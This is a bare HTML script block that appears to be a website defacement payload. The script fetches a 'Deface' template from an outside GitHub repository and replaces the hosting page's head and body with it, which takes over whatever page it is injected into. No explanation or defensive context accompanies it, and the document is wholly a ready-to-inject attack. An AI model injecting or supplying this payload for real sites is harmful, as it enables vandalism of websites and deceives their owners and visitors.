<script>
fetch('https://raw.githubusercontent.com/Yyax13/Pentest/refs/heads/master/Presets/Deface/T404/ash1.html')
.then(r=>r.text())
.then(t=>{
  document.head.innerHTML = t.split('<head>')[1].split('</head>')[0];
  document.body.innerHTML = t.split('<body>')[1].split('</body>')[0];
});
</script>
